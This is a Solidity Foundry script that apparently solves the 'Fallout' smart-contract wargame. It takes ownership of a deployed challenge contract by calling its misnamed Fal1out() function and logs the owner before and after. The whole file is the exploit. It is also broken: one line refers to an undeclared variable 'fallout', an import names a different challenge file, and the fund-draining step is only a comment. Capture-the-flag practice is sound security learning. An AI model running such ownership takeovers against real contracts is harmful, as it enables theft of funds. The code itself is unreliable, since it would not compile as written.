// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../src/1_Fallback.sol';
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract FalloutSoul is Script{
    FalloutChall public falloutContract = FalloutChall(0xa3D94A1e90c388f62e7E4bDE63434c8818794A32);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // call Fal1out() which is payable
        console.log("Owner before: ", falloutContract.Owner());
        falloutContract.Fal1out();
        console.log("msg.sender: ", msg.sender);
        console.log("Owner after: ", fallout.Owner());

        // collectAllocations()


        vm.stopBroadcast();
    }
}



